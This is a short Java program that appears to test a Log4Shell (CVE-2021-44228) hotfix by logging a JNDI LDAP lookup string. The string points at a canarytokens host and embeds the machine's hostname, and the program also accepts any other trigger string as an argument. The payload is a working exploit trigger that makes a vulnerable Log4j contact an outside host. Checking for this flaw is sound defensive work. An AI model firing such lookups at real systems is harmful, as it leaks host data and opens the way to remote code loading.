package de.silpion.log4shell.hotfix.side.effect;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.config.DefaultConfiguration;

public class Main {
    static {
        System.setProperty("com.sun.jndi.ldap.connect.timeout", "1000");
        System.setProperty("com.sun.jndi.ldap.read.timeout", "1000");
        System.setProperty(DefaultConfiguration.DEFAULT_LEVEL, Level.INFO.toString());
    }
    private final static Logger LOG = LogManager.getLogger(Main.class);

    private final static String GADGET = "${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}";

    public static void main(
        final String[] args
    ) throws Exception {
        LOG.info("Triggering CVE-2021-44228");
        LOG.info("Trigger: {}", args.length > 0 ? args[0] : GADGET);
    }
}